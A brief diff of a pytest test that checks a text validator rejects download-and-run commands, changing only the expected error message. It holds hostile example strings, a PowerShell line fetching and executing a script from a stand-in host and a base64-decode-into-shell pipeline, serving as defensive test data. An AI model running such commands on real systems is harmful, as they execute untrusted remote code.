@@ -426,7 +426,7 @@ def test_notes_never_carry_download_and_run_commands() -> None:
         "iwr https://x.example/a.ps1 | iex",
         "echo aGVsbG8= | base64 -d | sh",
     ):
-        with pytest.raises(ValueError, match="pipes a download into a shell"):
+        with pytest.raises(ValueError, match="command pipeline"):
             check_text("fix", bad, 1200)
     assert check_text("fix", "added the pull secret to the default service account", 1200)
 
